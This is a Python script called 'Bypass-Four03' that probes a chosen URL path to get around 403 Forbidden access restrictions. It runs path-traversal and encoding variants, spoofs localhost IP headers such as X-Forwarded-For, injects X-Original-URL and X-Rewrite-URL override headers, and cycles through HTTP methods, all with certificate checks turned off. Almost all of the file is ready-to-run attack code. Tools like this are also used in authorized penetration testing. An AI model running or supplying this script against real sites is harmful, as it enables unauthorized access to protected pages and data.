import sys
import requests
from urllib.parse import urljoin

# Disable SSL verification warnings
requests.packages.urllib3.disable_warnings()

# Colors for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    VIOLET = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def colorize_code(code):
    code_str = str(code)
    if code_str == "200":
        return f"{Colors.GREEN}{code_str}{Colors.RESET}"
    elif code_str in ["403", "404", "400"]:
        return f"{Colors.RED}{code_str}{Colors.RESET}"
    elif code_str in ["405"]:
        return f"{Colors.YELLOW}{code_str}{Colors.RESET}"
    elif code_str == "500":
        return f"{Colors.VIOLET}{code_str}{Colors.RESET}"
    else:
        return f"{Colors.YELLOW}{code_str}{Colors.RESET}"

def print_banner():
    print(f"{Colors.YELLOW}")
    print("  Bypass-Four03 (Python Edition)")
    print("                    By nazmul__ethi (Converted to Python)")
    print(f"{Colors.RESET}\n")

if len(sys.argv) < 3:
    print(f"Usage: python {sys.argv[0]} [URL] [path]")
    print(f"Example: python {sys.argv[0]} [https://example.com](https://example.com) admin")
    sys.exit(1)

target_url = sys.argv[1].rstrip('/')
path = sys.argv[2].strip('/')

print_banner()
print(f"Target: {target_url}/{path}\n")

# 1. Path Fuzzing
print(f"{Colors.VIOLET}=== PATH FUZZING ==={Colors.RESET}")
fuzz_paths = [
    f"{target_url}/{path}/../", f"{target_url}/{path}/..", f"{target_url}/../{path}",
    f"{target_url}/../{path}/../", f"{target_url}//{path}//", f"{target_url}//{path}",
    f"{target_url}/{path}//", f"{target_url}/./{path}", f"{target_url}/./{path}/./",
    f"{target_url}/.{path}", f"{target_url}/./{path}/.", f"{target_url}/{path}/../../",
    f"{target_url}/../../{path}/../../", f"{target_url}/../../{path}", f"{target_url}/{path}/../../../",
    f"{target_url}/../../../{path}", f"{target_url}/{path}/..%00/;", f"{target_url}/{path}/.asp",
    f"{target_url}/{path}.aspx", f"{target_url}/{path}.bak", f"{target_url}/{path}.json"
]

for p in fuzz_paths:
    try:
        r = requests.get(p, verify=False, allow_redirects=True, timeout=5)
        print(f"  --> {p}  Response: [{colorize_code(r.status_code)}] Size: {len(r.content)}")
    except Exception as e:
        print(f"  --> {p}  Error: {e}")

# 2. Header Fuzzing
print(f"\n{Colors.VIOLET}=== HEADER FUZZING ==={Colors.RESET}")
header_keys = [
    'X-Forwarded-For', 'X-Forwarded-Host', 'X-Host', 'X-ProxyUser-Ip',
    'X-Custom-IP-Authorization', 'X-Remote-IP', 'X-Originating-IP',
    'X-Remote-Addr', 'X-Client-IP', 'X-Real-IP'
]
ip_values = ['127.0.0.1', 'localhost', '0', '127.1', '10.0.0.1', '192.168.1.1']

base_target = f"{target_url}/{path}"
for h in header_keys:
    for val in ip_values:
        headers = {h: val}
        try:
            r = requests.get(base_target, headers=headers, verify=False, allow_redirects=True, timeout=5)
            print(f"  --> {base_target} [{h}: {val}] Response: [{colorize_code(r.status_code)}] Size: {len(r.content)}")
        except Exception as e:
            pass

# Special URL override headers
special_headers = [
    {"X-Original-URL": f"/{path}"},
    {"X-Rewrite-URL": f"/{path}"},
    {"X-Original-URL": "/admin/"},
    {"Host": "localhost"}
]
for sh in special_headers:
    try:
        r = requests.get(target_url, headers=sh, verify=False, allow_redirects=True, timeout=5)
        print(f"  --> {target_url} [Headers: {sh}] Response: [{colorize_code(r.status_code)}] Size: {len(r.content)}")
    except Exception as e:
        pass

# 3. HTTP Method Fuzzing
print(f"\n{Colors.VIOLET}=== HTTP METHOD FUZZING ==={Colors.RESET}")
methods = ["PUT", "POST", "CONNECT", "TRACE", "PATCH", "HEAD"]
for m in methods:
    try:
        r = requests.request(m, base_target, verify=False, allow_redirects=True, timeout=5)
        print(f"  --> {base_target} -X {m} Response: [{colorize_code(r.status_code)}] Size: {len(r.content)}")
    except Exception as e:
        print(f"  --> {base_target} -X {m} Error: {e}")